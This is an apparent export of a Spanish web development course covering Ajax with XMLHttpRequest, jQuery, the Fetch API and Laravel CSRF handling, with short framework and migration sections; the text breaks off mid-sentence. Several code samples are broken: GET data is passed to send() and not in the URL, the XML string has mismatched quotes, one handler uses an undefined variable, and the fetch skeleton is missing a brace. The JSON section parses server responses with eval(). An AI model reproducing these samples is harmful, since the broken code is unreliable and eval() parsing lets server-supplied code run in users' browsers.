    "content": "En este apartado vamos a aprender a enviar y recibir respuestas por Ajax mediante JavaScript clásico. El objeto XMLHttpRequest es la forma tradicional de trabajar con Ajax en JavaScript. Hay rumores fundados de que este objeto va a ser declarado obsoleto en breve (puede que ya lo esté cuando leas estas líneas). Por esa razón, no es muy buena idea usarlo para desarrollos nuevos. Sin embargo, lo vamos a ver aquí por dos razones: primera, porque hay mucho código antiguo JavaScript circulando por ahí donde lo vas a encontrar. Y, segunda, porque es una forma muy conveniente de comprender cómo funciona la comunicación asíncrona con el servidor. En apartados posteriores veremos cómo trabajar con Ajax mediante otros mecanismos no (presuntamente) obsoletos. 7.2.1. Peticiones sin datos al servidor . La forma más sencilla (y primitiva) de usar Ajax es lanzar una petición asíncrona al servidor sin que el usuario de la web se percate de ello (porque se hará en segundo plano). El servidor no sabrá si la petición se lanzó en primer o en segundo plano y, en realidad, no le importa: él se limitará a atender la petición. Para lanzar una petición mediante Ajax usando JavaScript tradicional (luego veremos cómo hacerlo con jQuery, que simplifica bastante el proceso), necesitamos crear un objeto de tipo XMLHttpRequest. Este objeto nos permitirá controlar todo el proceso de envío de la petición, recepción de la posible respuesta y control de los errores que hayan podido ocurrir. Observa detenidamente este fragmento de código JavaScript: . peticion_http = new XMLHttpRequest(); peticion_http.onreadystatechange = procesa_respuesta; peticion_http.open('GET', 'http://servidor/recurso'); peticion_http.send(null); function procesa_respuesta() { if(peticion_http.readyState == 4) { if(peticion_http.status == 200) { alert(peticion_http.responseText); } } } . En las cuatro primeras líneas se crea el objeto de tipo XMLHttpRequest y luego se hacen tres cosas clave con él: . | Se le indica qué función se debe ejecutar cuando el servidor responda. Recuerda que esta función se ejecutará también en segundo plano, sin que el usuario de la página se percate de que está sucediendo algo. | Se le indica qué recurso del servidor se quiere invocar (típicamente, una URL). Para ello se usa el método open(). Ahí también se indica el método de envío de datos al servidor (GET o POST), incluso si no se envían datos al servidor en absoluto, como en este ejemplo. | Por último, se lanza la petición al servidor con el método send(). El argumento “null” debe sustituirse por los datos que se envían al servidor mediante GET en caso de que los hubiera. | . Eso deja lista la petición. JavaScript permanecerá a la escucha en segundo plano hasta que el servidor responda. Cuando lo haga, se ejecutará la función procesa_respuesta(). En esa función se hacen tres cosas muy importantes: . | Se comprueba si el estado de la petición (readyState) es 4. Eso significa que el servidor ha terminado de procesarla. La petición pasa por varios estados hasta completarse, y el servidor informa de todos ellos. Es decir, la función procesa_respuesta() se ejecuta al menos una vez para cada uno de estos estados: . | readyState == 1 -&gt; OPENED: Se acaba de abrir la comunicación con el servidor. Es decir, se acaba de ejecutar open(). | readyState == 2 -&gt; HEADERS_RECEIVED: Se acaba de enviar la petición al servidor. Es decir, se acaba de ejecutar send(). | readyState == 3 -&gt; LOADING: Se está recibiendo la respuesta del servidor. | readyState == 4 -&gt; DONE: Se ha recibido la respuesta del servidor. Por eso es necesario comprobar que readyState == 4 antes de hacer ninguna otra cosa. | . | Se comprueba que la respuesta del servidor es 200. Esto, según el protocolo http, significa que no hay errores en la página. El servidor puede responder con otros códigos, como 404 (recurso no encontrado) o 403 (prohibido el acceso a ese recurso). Puedes encontrar en miles de sitios de internet todas las posibles respuestas de una petición http. | Si readyState == 4 y status == 200, significa que todo ha ido bien y el servidor ha respondido. Ya podemos hacer lo que sea que tengamos que hacer con esa respuesta. En este ejemplo, nos hemos limitado a mostrar esa respuesta en un alert. Observa en el ejemplo como la respuesta del servidor se recibe en forma de String en el atributo responseText. | . 7.2.2. Peticiones con datos al servidor (GET) . Si has entendido el ejemplo anterior, este te va a costar muy poco. Simplemente, vamos a enviar algunos datos al servidor por GET, exactament igual que lo haríamos si los enviáramos mediante un formulario. De hecho, el servidor no notará la diferencia. El código para lograrlo es este: . var cp = document.getElementById(\"codigo_postal\"); var telefono = document.getElementById(\"telefono\"); query_string = \"&amp;codigo_postal=\" + encodeURIComponent(cp.value) + \"&amp;telefono=\" + encodeURIComponent(telefono.value); peticion_http = new XMLHttpRequest(); peticion_http.onreadystatechange = procesa_respuesta; peticion_http.open('GET', 'http://servidor/scrip.php'); peticion_http.send(query_string); function procesa_respuesta() { .... } . No ponemos la función procesa_respuesta() porque es la misma de antes. En cambio, sí que hay algunos añadidos en el código de preparación de la solicitud, ¿verdad? . Para empezar, hemos cogido un par de datos de un formulario: el código postal y el teléfono (puede ser un formulario de alta de usario o algo por el estilo: recuerda que esto solo es un ejemplo). Luego hemos creado una variable llamada queryString que contiene el string con los datos que queremos enviar al servidor por GET. Como los datos por GET se codifican en la URL, es necesario usar el formato de la URL (separando las variables con el carácter &amp;) y codificar cualquier carácter especial (con la función encodeURIComponente() de Javascript). Por último, en el momento de hacer send(), hemos agregado nuestra query_string para que sea enviada al servidor. Una vez allí, PHP la podrá procesar como cualquier otra string enviada por GET, es decir, usando las variables superglobales $_GET o $_REQUEST. 7.2.3. Peticiones con datos al servidor (POST) . Si, en lugar de enviar datos al servidor por GET, preferimos enviar datos por POST, la técnica es muy similar a la anterior, con un par de variaciones: . | Debemos indicar “POST” en lugar de “GET” en el método open(), como es lógico. | Debemos indicarle a Ajax que el paquete http llevará variables POST en su cabecera. Para eso se usa el método setRequestHeader(). | . Lo puedes ver en el siguiente ejemplo: . var cp = document.getElementById(\"codigo_postal\"); var telefono = document.getElementById(\"telefono\"); query_string = \"&amp;codigo_postal=\" + encodeURIComponent(cp.value) + \"&amp;telefono=\" + encodeURIComponent(telefono.value); peticion_http = new XMLHttpRequest(); peticion_http.onreadystatechange = procesa_respuesta; peticion_http.open(\"POST\", \"http://servidor/script.php\"); peticion_http.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\"); peticion_http.send(query_string); function procesa_respuesta() { .... } . 7.2.4. Peticiones con datos al servidor (XML) . Todo esto está muy bien si lo que enviamos al servidor son un par de datos sueltos, como el código postal y el teléfono en los ejemplos anteriores. Pero ¿y si tenemos que enviar mucha información? Digamos, por ejemplo, un array de códigos postales y teléfonos. En ese caso, usar GET se hace inviable (por la limitación de caracteres), así que recurriremos a POST y empaquetaremos nuestros datos en un string XML o JSON. En este ejemplo, vamos a usar XML: . var cp = document.getElementById(\"codigo_postal\"); var telefono = document.getElementById(\"telefono\"); xml = \"&lt;datos&gt;\" + \"&lt;cp&gt;\" + cp + &lt;/cp&gt;\" + &lt;telefono&gt; + telefono + &lt;/telefono&gt; + \"&lt;/datos&gt;\"; peticion_http = new XMLHttpRequest(); peticion_http.onreadystatechange = procesa_respuesta; peticion_http.open(\"POST\", \"http://servidor/script.php\"); peticion_http.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\"); peticion_http.send(xml); function procesa_respuesta() { .... } . ",
    "url": "https://iescelia.org/docs/dwes/_site/ajax/#72-c%C3%B3mo-enviar-peticiones-ajax-al-servidor-con-javascript-cl%C3%A1sico",
    "relUrl": "/ajax/#72-cómo-enviar-peticiones-ajax-al-servidor-con-javascript-clásico"
  },"54": {
    "doc": "7 Ajax",
    "title": "7.3. Cómo recibir la respuesta del servidor con JavaScript clásico",
    "content": "En todos los ejemplos anteriores, el servidor conestaba con un simple texto que mostrábamos por medio de un alert() de Javascript. Ni siquiera nos preocupamos por el contenido de ese texto. Podría ser cualquier cosa: algo como “petición procesada”, “usuario borrado” o cosas por el estilo. Pero a veces el servidor tiene que contestar algo complejo. Por ejemplo, una tabla completa. En ese caso, como es lógico, necesitamos recurrir a XML o JSON para empaquetar todos los datos de la respuesta y enviarlos desde el servidor hacia el cliente. Vamos a ver un par de ejemplo, uno resuelto con XML y otro con JSON. En ninguno de los dos casos mostraremos cómo lo hace el servidor para crear los datos: supondremos que eso ya sabes hacerlo, puesto que se trata de PHP. Nos centraremos en cómo procesa Ajax, es decir, Javascript, esa respuesta. 7.3.1. Recepción de datos XML . En este ejemplo, el servidor nos devuelve un string XML consistente en un array de códigos postales y teléfonos (de clientes, de usuarios, de lo que sea. Recuerda -otra vez- que solo es un ejemplo). Observa cómo esa respuesta se accede por medio de responseXML (no responseText, como hasta ahora). A partir de ahí, Javascript puede usar esa respuesta como un objeto XML cualquiera: puede buscar hijos de un nodo, puede buscar nodos por su tag, etc. En el ejemplo, nos limitamos a recuperar el código postal y el teléfono del primer elemento del array y a mostrarlo en el documento preexistente, en una capa con el ID “respuesta”. function procesaRespuesta() { if(peticion_http.readyState == 4) { if(peticion_http.status == 200) { var xml = peticion_http.responseXML; var datos = xml.getElementsByTagName(\"datos\")[0]; var telefono = datos.getElementsByTagName(\"telefono\")[0]. firstChild.nodeValue; var cp = datos.getElementsByTagName(\"cp\")[0]. firstChild.nodeValue; document.getElementById(\"respuesta\").innerHTML = \"Codigo postal = \" + codigo_postal + \"&lt;br/&gt;\" + \"Telefono = \" + telefono; } } } . 7.3.2. Recepción de datos JSON . Javascript prefiere JSON a XML, es no es un secreto. Casi todos los programadores lo prefieren, en realidad. Así que veamos cómo hacer lo mismo que antes, pero ahora con JSON. La respuesta JSON llegará en responseText, no en responseXML. Eso significa que Javascript la recibe como un String cualquiera. Luego, con la función eval() de Javascript, podemos convertir ese String en un objeto complejo y, a partir de ahí, usar ese objeto para acceder a todos sus elementos. En el ejemplo, como antes, solo accederemos al primer código postal y al primer teléfono y los mostraremos en la capa “respuesta” de nuestro documento. function procesaRespuesta() { if(http_request.readyState == 4) { if(http_request.status == 200) { var json = http_request.responseText; var objeto_json = eval(\"(\"+json+\")\"); var telefono = objeto_json.datos.telefono; var codigo_postal = objeto_json.datos.cp; document.getElementById(\"respuesta\").innerHTML = \"Codigo postal = \" + codigo_postal + \"&lt;br/&gt;\" + \"Telefono = \" + telefono; } } } . ",
    "url": "https://iescelia.org/docs/dwes/_site/ajax/#73-c%C3%B3mo-recibir-la-respuesta-del-servidor-con-javascript-cl%C3%A1sico",
    "relUrl": "/ajax/#73-cómo-recibir-la-respuesta-del-servidor-con-javascript-clásico"
  },"55": {
    "doc": "7 Ajax",
    "title": "7.4. Ajax y jQuery",
    "content": "El uso de jQuery facilita enormemente la programación de llamadas Ajax al servidor. El decir: se puede manejar Ajax al 100% sin recurrir a jQuery, pero con jQuery es más fácil. jQuery ofrece varias funciones para hacer llamadas Ajax: . | $.ajax() → La más configurable pero también la más compleja. | $.get() → Para lanzar peticiones GET sencillas. | $.post() → Para lanzar peticiones POST sencillas | $.load() → Para lanzar peticiones GET y cargar la respuesta en una capa. | . Vamos a verlas una por una. 7.4.1. Función $.ajax() . Tiene esta sintaxis: . $.ajax({ url: '/ruta/hasta/script.php', type: 'POST', data: 'parametro1=valor1&amp;parametro2=valor2', contentType: 'tipo de contenido que enviamos al servidor', dataType: 'tipo de contenido con el que responde el servidor', success: function(data) { // Aquí el código para procesar la respuesta }, fail: function() { // Aquí el código para procesar el error } }); . Bueno, en realidad $.ajax() admite más argumentos aparte de los que te muestro aquí arriba, pero estos son los principales. Si quieres verlos todos, te sugiero que te des una vuelta por la documentación oficial de jQuery, que por cierto es fantásticamente buena. Observa como, en una sola invocación, conseguimos hacerlo todo: indicar la URL donde se dirigirá la petición, el tipo de envío de datos (GET o POST), los datos que enviamos al servidor, el tipo de datos que recibiremos como respuesta, el nombre de la función que procesará la respuesta e, incluso, el nombre de la función que procesará el error, en caso de que el servidor responda con un código de error. En contentType puedes indicar el tipo de datos que vas a enviar al servidor. Por defecto, se supone que es ‘application/x-www-form-urlencoded; charset=UTF-8’, pero te puede interesar cambiarlo por ‘multipart/form-data’, por ejemplo, si vas a enviar un archivo binario (como una imagen). En dataType puedes indicar el tipo de datos que se espera que te devuelva el servidor. Por defecto será ‘text’, es decir, texto plano, pero puedes indicar cosas muy variadas, como ‘xml’, ‘json’, ‘html’ o incluso ‘script’ si el servidor te va a devolver un fragmento de código JavaScript. Esto ayuda a su procesamiento posterior en la sección success. Por último, en la sección success puedes acceder a los datos devueltos por el servidor a través de la variable data, que tendrá el formato correspondiente al tipo de datos que hayas indicado en dataType. Por ejemplo, si en dataType especificaste que el servidor iba a responder con un objeto json, jQuery tratará de convertir la respuesta a un objeto asumiendo el formato json y te la dejará preparada y lista para usar en el parámetro data. Aquí vemos un ejemplo de uso de $.ajax(): . $(document).ready(function () { $.ajax({ type: \"POST\", url: \"mi-script.php\", data: {email: $(\"#email\").val()}, success: function (data) { $(\"#message\").html(data); }, error: function (req, status, error) { alert(req + \" \" + status + \" \" + error); } }); }); . Si es la primera vez que ves código jQuery, esto te sonará tanto como el chino mandarín. Pero no te agobies, que en realidad es muy fácil. Te lo explico en cuatro frases. La primera línea, $(document).ready(), sirve para indicar al navegador que no debe ejecutar la función que haya ahí dentro hasta que el documento no se haya cargado por completo y el árbol DOM desplegado en la memoria del cliente. Solo entonces se lanzará el resto del código. Es algo muy común en el código jQuery. Después viene la llamada Ajax, con varios de los atributos que mencionábamos antes. Fíjate que no hemos usado ni dataType ni contentType, por lo que se asumirán los valores por defecto. En la sección data se especifican los datos que se envían a mi-script.php. Solo enviamos un email, pero podríamos enviarle más cosas. Observa que lo hemos formateado en json. Es lo más habitual. En la sección success hemos colocado directamente el código de la función que se lanzará al recibir la respuesta del servidor. Esa forma de inyectar funciones sin nombre directamente es muy habitual de jQuery. La función se limita a tomar la respuesta del servidor y mostrarla en una capa con el ID “#message”, pero, por supuesto, podría hacer cualquier otra cosa más compleja. En la sección error, por último, lanzamos un mensaje de error mediante un alert(), que solo saltará si ocurre algún error durante la petición Ajax. Fíjate en que esa función tiene tres parámetros (optativos) que utilizamos para informar al usuario con más detalle de qué error se ha producido. 7.4.2. Funciones $.get() y $.post() . En muchas ocasiones, no necesitamos usar ni la mínima parte de las posibilidades de la función $.ajax(). Cuando tenemos que hacer una llamada sencillita por Ajax al servidor y no queremos complicarnos la vida, puede ser más útil y rápido recurrir a las funciones $.get() y $.post(). Como su propio nombre indica, $.get() lanza una petición Ajax mediante GET y $.post() hace lo mismo, pero con POST. Su sintaxis es esta: . $.get(url, datos, funcion_manejadora); $.post(url, datos, funcion_manejadora); . Aquí tienes un ejemplo en el que llamamos por Ajax a mi-script.php, enviándole mediante GET un nick de usuario. El servidor responderá con un texto plano que contendrá el nombre de ese usuario y lo mostrará mediante un alert(): . $.get('mi-script.php', { user: 'juanperez03' }, function(username) { alert('Hola, ' + username); } ); . 7.4.3. Función $.load() . Un caso particularmente simple (y habitual) de uso de Ajax es aquel en el que lanzamos una petición al servidor para rellenar una capa de nuestra página con la información que el servidor nos devuelve. Por ejemplo, imagina que tenemos un formulario de registro de usuarios y, en el campo del nick del usuario, deseamos comprobar si ese nick ya está en uso en la base de datos. Mediante Ajax, se puede hacer de forma dinámica y atractiva capturando el evento onblur en del campo nick y lanzando en ese momento una petición Ajax al servidor para que haga la consulta a la base de datos. Si el usuario ya existe, el servidor puede responder con un texto el tipo “Ese usuario ya existe”. En caso contrario, puede responder con “Ese nick está disponible” o algo así. En ambos casos, ese String puede mostrarse en una capa junto al cuadro de texto, una capa que, hasta ese momento, habrá estado vacía. Este escenario tan habitual se puede resolver con $.ajax(), con $.get() o con $.post(), pero existe una función jQuery específica para ello. Se llama $.load() y tiene esta sintaxis: . $('#info').load('mi-script.php'); . Simplemente, se ejecuta mi-script.php en el servidor y se carga el texto de respuesta en la capa #info. Sin funcion manejadora ni historias. Más fácil, imposible, ¿verdad? . ",
    "url": "https://iescelia.org/docs/dwes/_site/ajax/#74-ajax-y-jquery",
    "relUrl": "/ajax/#74-ajax-y-jquery"
  },"56": {
    "doc": "7 Ajax",
    "title": "7.5. Ajax y la API Fetch",
    "content": "Hubo un tiempo en el que todos los programadores que querían una sintaxis limpia a la hora de usar Ajax se decantaban por jQuery. Sin embargo, la tecnología en el campo del desarrollo web cambia tan deprisa, que jQuery ya se considera una biblioteca algo desfasada. Sin embargo, la sintaxis de $.ajax(), la función de jQuery para gestionar llamadas Ajax, ha tenido un eco en las versiones más recientes de JavaScript, que ahora tiene su propia forma integrada de hacer solicitudes Ajax: mediante la API Fetch, un nuevo estándar para realizar solicitudes de servidor. En esta sección vamos a aprender a lanzar peticiones GET y POST usando la API Fetch de JavaScript. 7.5.1. Promesas de JavaScript . Para hacer peticiones asíncronas al servidor el la API Fetch, usaremos el método fetch(). Y el método fetch() devuelve lo que en JavaScript se denomina una promesa (promise), así que, antes de continuar, tenemos que comprender qué es eso de las promesas. Entendiendo las promesas de JavaScript . Imagina que vas a pedir una pizza a un local de comida rápida. Pagas en el mostrador y te dan un ticket con un número. Cuando llamen a ese número, podrás recoger tu pizza. Ese ticket es una promesa. El ticket significa que, en el futuro, obtendrás una pizza. Pero que todavía no la tienes. Cuando llaman a tu número, significa que la promesa se ha cumplido. Si no te llaman, significa que la promesa no se cumplió. Hay múltiples razones por las que una promesa puede no cumplirse nunca, ¿verdad? En el caso de la pizza, puede que el cocinero se quede sin ingredientes, puede que un inspector de sanidad cierre el establecimiento o puede haber un incendio en la cocina. Literalmente, hay millones de razones por las que una promesa podría no cumplirse, aunque lo normal es que lo haga. En resumen, una promesa se resuelve cuando ocurre alguna de estas cosas: . | Obtenemos la comida. | No obtenemos la comida pero sí una razón de por qué no. | . Las promesas, de hecho, pueden estar en 3 estados: . | Pendientes. Una promesa recién lanzada está en este estado. | Resueltas. La promesa pasa a este estado si se resuelve correctamente. | Rechazadas. La promesa pasa a este estado si se produce un error y no puede atenderse la petición. | . 7.5.2. Lanzando peticiones asíncronas con Fetch . La sintaxis básica de una petición asíncrona con fetch() es esta: . fetch(url) .then(function() { // Este código se ejecuta cuando el estado pasa a \"Promesa Resuelta\" .catch(function() { // Este código se ejecuta cuando el estado pasa a \"Promesa Rechazada\" }); . Con el método fetch() se obtiene una promesa. Si la promesa se resuelve con éxito, es decir, si el servidor responde correctamente, se ejecuta la función dentro del método then(). Y, si falla, se ejecuta la función que hay dentro de catch(). Lo habitual, por supuesto, es que el servidor responda a nuestras peticiones con datos. Puede ser algo tan simple como un valor booleano o algo tan complejo como una tabla llena de objetos formateada en JSON. Si la llamada al servidor va a devolver datos, estos se recogen en un parámetro de la función del then(). Del mismo modo, si se ha producido un error, este se recoge como parámetro en la función del catch(): . fetch(url) .then(function(data) { // Procesar la respuesta. Los datos están en \"data\" }) .catch(function(error) { // Procesar el error. El error está en \"error\" }); . 7.5.3. Lanzar peticiones por POST . Fetch supondrá que todas las peticiones al servidor se envían por GET, salvo que se le indique lo contrario. Para lanzar una petición por POST se debe utlizar un segundo argumento de la función fetch() y pasarle el encabezado http con los datos que se van a enviar. Por ejemplo: . const url = 'https://mi-servidor/mi-ruta'; let data = { name: 'Pepe', age: 42 } let httpData = { method: 'POST', body: data, headers: new Headers() } fetch(url, httpData) .then(function() { // Procesar la respuesta del servidor }); . Headers es parte de la API Fetch. Permite manipular los encabezados de las solicitudes y respuestas http, que es donde se empaquetan los datos enviados por POST. La variable fetchData, por tanto, llevará todos los datos que se van a enviar por POST. El API Fetch puede usarse de otras maneras, pero esto es más que suficiente para empezar a trabajar con el servidor en modo asíncrono en una gran variedad de situaciones diferentes. ",
    "url": "https://iescelia.org/docs/dwes/_site/ajax/#75-ajax-y-la-api-fetch",
    "relUrl": "/ajax/#75-ajax-y-la-api-fetch"
  },"57": {
    "doc": "7 Ajax",
    "title": "7.6. Ajax y Laravel",
    "content": "Al trabajar con Laravel, estamos acostumbrados a que cada método del controlador termine devolviendo una vista completa (return view…). ¿Pero qué pasa si hacemos una petición Ajax a una aplicación web escrita con Laravel en el lado del servidor? . Laravel puede continuar devolviendo una vista completa, pero es no suele ser lo que Ajax espera recibir como respuesta. Ajax espera respuestas cortas y concisas: algo como ‘true’ o ‘false’, o un número, o un String o, como mucho, una estructura de datos más compleja formateada en XML o JSON. Pero no una página web completa con su cabecera, su cuerpo y toda la parafernalia. Y eso es precisamente lo que devuelve Laravel al rederizar cualquier vista. Así que, ¿cómo lo hacemos? . 7.6.1. Paso 1. Crear un controlador para las peticiones Ajax . Esto no es imprescindible, pero sí suele ser una práctica habitual: reunir todas las peticiones Ajax en un único controlador. Ten en cuenta que, para el servidor, no hay diferencia entre una petición Ajax y una petición normal. El servidor recibe su petición por http o https y la atiende, ejecutando en enrutador, el controlador y todo lo que venga detrás, y produciendo una salida como resultado que se envía de vuelta al cliente. Punto. Así que suele ser buena idea separar las peticiones Ajax de las peticiones normales mediante la diferenciación de controladores, salvo que tengas una muy biena razón para no hacerlo. Por lo tanto, crearemos un controlador AjaxController y añadiremos a nuestro enrutador (/routes/web.php) las líneas correspondientes, como esta: . Route::post('miJqueryAjax','AjaxController@miMetodo'); . 7.6.2. Paso 2. Crear los métodos del controlador . Lo siguiente sería crear los métodos que necesitemos en AjaxController (o, si hemos decidido no crear un controlador específico para Ajax, crear los métodos en los controladores que corresponda). Solo hay que tener una cosa clara: estos métodos que responderán a las peticiones Ajax no pueden terminar con una vista. Imagina un método que reponderá a una petición Ajax y que solo deba responder con un String, cuyo valor pueda ser “Ese usuario ya existe” o “Usuario disponible”. Lo haríamos así: . class AjaxController extends Controller { public function miMetodo() { ...aquí va mi código... if ($lo_que_sea) $result = \"Ese usuario ya existe\"; else $result = \"Usuario disponible\"; return $result; } } . Imagina ahora que queremos devolver algo más complicado, como un array o una colección de datos. No pasa nada: los formateamos como json y los enviamos de regreso al cliente, así: . class AjaxController extends Controller { public function miMetodo() { ...aquí va mi código... return response()-&gt;json($mi_variable_compleja); } } . Por supuesto, esta última manera también te funcionará para devolver un simple String, un booleano o un entero. Es la forma más conveniente de terminar un método de un controlador que va a ser invocado por Ajax y no mediante una petición normal al servidor. Ten en cuenta que: . | La salida de una petición Ajax suele ser JSON, pero podría ser otra cosa: HTML, XML o simple texto plano. | Lo repetimos una vez más: para responder a una petición Ajax no se debe renderizar una vista (¡salvo que tengas una muy buena excusa para hacerlo!), sino que basta con un return response(). | . 7.6.3. Paso 3. Agregar el token CSRF a las peticiones . Como vimos al estudiar Laravel, las peticiones enviadas por POST con Laravel deben llevar el token CSRF o serán rechazadas. Esto se hacía para prevenir cierto tipo de ataques frecuentes a través de formularios HTML. Los detalles no son importantes aquí y, en todo caso, puedes repasar el capítulo sobre Laravel o sobre Sesiones, Cookies y Seguridad para revisar el concepto. Lo importante ahora es esto: cuando lances una petición POST mediante Ajax, Laravel la rechazará porque no llevará el token CSRF. Recuerda que el servidor no tiene ni idea de si la petición llega desde Ajax o no: para él, se trata de datos que provienen de un formulario HTML, y si no lleva ese token, automáticamente se convierte en un formulario sospechoso. Así que, si tienes Laravel en el lado del servidor, necesitas agregar el token CSRF a las peticiones por POST, así: . $.ajax({ method: \"POST\", url: \"mi-url\", data: { \"_token\": \"{{ csrf_token() }}\" }, ...etc... }); . Por supuesto, puedes añadir más data a tu petición: tantos datos como necesites enviar al servidor. Como esto puede ser un poco engorroso, hay una forma de agregar automáticamente el token CSRF a todas las peticiones. Basta con escribir esto en el header de nuestro layout: . &lt;meta name=\"csrf-token\" content=\"{{ csrf_token() }}\"&gt; &lt;script type=\"text/javascript\"&gt; $.ajaxSetup({ headers: { 'X-CSRF-TOKEN': $('meta[name=\"csrf-token\"]').attr('content') } }); &lt;/script&gt; . A partir de ahora, podremos hacer las peticiones Ajax normalmente, porque el token CSRF se añadirá él solito a cada petición Ajax. Ajax, Laravel y Vue.js . Esta parte la veremos más adelante… ¡si nos da tiempo! . ",
    "url": "https://iescelia.org/docs/dwes/_site/ajax/#76-ajax-y-laravel",
    "relUrl": "/ajax/#76-ajax-y-laravel"
  },"58": {
    "doc": "7 Ajax",
    "title": "7 Ajax",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/ajax/",
    "relUrl": "/ajax/"
  },"59": {
    "doc": "8 Otras tecnologías",
    "title": "8. Otras tecnologías",
    "content": "En esta sección vamos a hacer un repaso rápido a otras tecnologías para desarrollo web del lado del servidor diferentes de PHP sobre Apache (o similar). Será solo un vistazo superficial, para que te hagas una idea de cómo huelen y a qué saben estos otros lenguajes y veas que, en lo sustancial, no difieren mucho unas de otras, al menos desde el punto de vista del programador. Todas las diferencias se centran en los detalles, no en lo principal. Esto quiere decir que, si te manejas bien con PHP, podrás pasarte a cualquiera de estos lenguajes con muy poco esfuerzo y en solo unos días. ",
    "url": "https://iescelia.org/docs/dwes/_site/otras-tecnologias/#8-otras-tecnolog%C3%ADas",
    "relUrl": "/otras-tecnologias/#8-otras-tecnologías"
  },"60": {
    "doc": "8 Otras tecnologías",
    "title": "8 Otras tecnologías",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/otras-tecnologias/",
    "relUrl": "/otras-tecnologias/"
  },"61": {
    "doc": "5.1 Frameworks PHP MVC",
    "title": "5.1. ¿Qué es un framework?",
    "content": ". | 5.1.1. ¿Realmente necesito un framework para desarrollar una aplicación web? | 5.1.2. ¿Qué framework escoger? | . Un framework es un conjunto estandarizado de prácticas de programación para resolver una serie de problemas habituales. El framework proporciona una serie de clases, librerías y otros componentes para facilitar el desarrollo ágil, seguro y escalable de nuevas aplicaciones. Por lo tanto, un framework MVC PHP es un conjunto de clases, librerías y otros componentes destinados a servir de base para desarrollar aplicaciones en PHP con arquitectura MVC. La idea es esta: no inventar la rueda cada vez que la necesitamos. 5.1.1. ¿Realmente necesito un framework para desarrollar una aplicación web? . No, los frameworks nunca son imprescindibles… . …pero casi siempre son muy convenientes. Hay programadores pro-frameworks y anti-frameworks. Los programadores anti-frameworks acaban desarrollando, aposta o sin querer, su propio framework después de llevar varias aplicaciones MVC a sus espaldas. Para decidir si necesitas un framework o no, tienes que conocer antes cómo funcionan y qué ventajas e inconvenientes presentan. Usar un framework tiene ciertas ventajas, como: . | Reutilización del trabajo ya hecho (recuerda: no reinventar la rueda). | Extensa documentación. | Separación en capas. | Seguimiento de buenas prácticas de programación. | Escalabilidad y mantenimiento. | Desarrollo más rápido y, por tanto, más económico. | . Pero también tiene algunos inconvenientes: . | A veces pueden limitar el desarrollo. | Curva de aprendizaje costosa (más en unos frameworks que en otros). Es decir: al principio iremos más lentos que sin framework, hasta que le cojamos el tranquillo. | Puede llegar a implicar más trabajo, dependiendo del proyecto. | Preferencias personales: algunos programadores solo se sienten cómodos si todo el código es suyo. | Actualizaciones frecuentes e imprevistas. A menudo, la actualización de un framework hace que parte de tu aplicación deje de funcionar. | Ocultan gran parte del funcionamiento de la aplicación: no son aptos para aprender a programar. | . En resumen: la idea es que, al usar un framework, solo te centras en desarrollar lo importante. El resto (lo que ya estaba desarrollado en el framework y que es común a muchas aplicaciones web) no te quita tiempo. 5.1.2. ¿Qué framework escoger? . Existen multitud de frameworks MVC PHP. Estos son algunos de gran implantación en la actualidad: . | Symfony: el más extendido desde hace años. | Laravel: el que tiene un crecimiento más rápido. | CodeIgniter: el más sencillo, aunque su implantación en la industria el menor. | Otros framworks MVC PHP importantes son Zend Framework, Yii y CakePHP. | . Lamentablemente, no hay respuesta a la pregunta: ¿qué framework es mejor? . Puedes pasar el resto de tu vida leyendo en foros y en blogs, descargando e instalando varios frameworks para desecharlos a los dos días, esperando a que salga una nueva versión o un framework nuevo… . Nunca podrás responder a esa pregunta. Como mucho, podrás responder a esta otra: ¿qué framework prefiero? Y eso solo después de haber probado varios durante algún tiempo. Además, el framework por sí sólo puede no ser suficiente para un desarrollo completo, y probablemente harán falta otros componentes que afectarán a la experiencia de programación. Algunos ejemplos son: . | Librerías del lado del servidor: pear, pChart, doctrine… | Librerías del lado del cliente: jQuery, Vue.js, Angular, React, bootstrap… | . ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/que-es-un-framework.html#51-qu%C3%A9-es-un-framework",
    "relUrl": "/laravel/que-es-un-framework.html#51-qué-es-un-framework"
  },"62": {
    "doc": "5.1 Frameworks PHP MVC",
    "title": "5.1 Frameworks PHP MVC",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/que-es-un-framework.html",
    "relUrl": "/laravel/que-es-un-framework.html"
  },"63": {
    "doc": "5.10 Migraciones",
    "title": "5.10. Migraciones",
    "content": ". | 5.10.1. Crear tablas mediante las migraciones | 5.10.2. Modificar tablas mediante migraciones | 5.10.3. Otras operaciones en las migraciones | 5.10.4. Seeding | 5.10.4. Automatizar el seeding | 5.10.5. Lista de comandos superútiles para manejar migraciones | . Las migraciones constituyen una especie de control de versiones para la base de datos de la aplicación. Permiten crear y modificar tablas de la BD con independencia del SGBD que estemos usando. Con las migraciones no solo podrás reconstruir la base de datos en menos de lo que tarda en decirse “Von Neumann” (algo muy práctico cuando estás en fase de desarrollo), sino que podrás parchear la base de datos de una aplicación en producción en un tiempo record y con riesgo cero. (Solo el que ha tenido que parchear la base de datos de una aplicación en producción antes de la existencia de las migraciones sabe la tranquilidad de espíritu que esto produce y la cantidad de problemas embarazosos que te quita de encima). Antes de empezar, recuerda que, para que cualquier operación sobre la base de datos funcione, debes tener bien configuradas estas variables de entorno del archivo .env de Laravel: . DB_HOST=localhost DB_DATABASE=mi-base-de-datos DB_USERNAME=mi-usuario-de-BD DB_PASSWORD=mi-password-de-BD . 5.10.1. Crear tablas mediante las migraciones . La primera cosa para las que sirven las migraciones es para crear las tablas de tu aplicación. Olvídate de exportar e importar a mano el archivo SQL de tu base de datos. Eso lo hacían los cromañones. Vamos a trabajar con un ejemplo, como siempre. Imagina que tenemos una tabla llamada Clients con los campos típicos: id, name, address, etc. De acuerdo. Creemos, paso a paso, las migraciones de esta tabla: . Paso 1: Inicializar el sistema de migraciones de Laravel (si ya lo hemos hecho antes, nos dará un error al intentar hacerlo otra vez): . $ php artisan migrate:install . Paso 2: Crear la migración para la tabla Clients: . $ php artisan make:migration create_clients_table . Esto generará un fichero en la carpeta /database/migrations cuyo nombre contendrá un timestamp o marca de tiempo. Vamos, que contendrá un numerajo con la fecha y hora actual. Algo tan bonito como /database/migrations/20221226072434createclientstable.php . Si editas ese fichero, verás dos métodos: . | up() → se ejecuta cuando se lanza la migración. Se 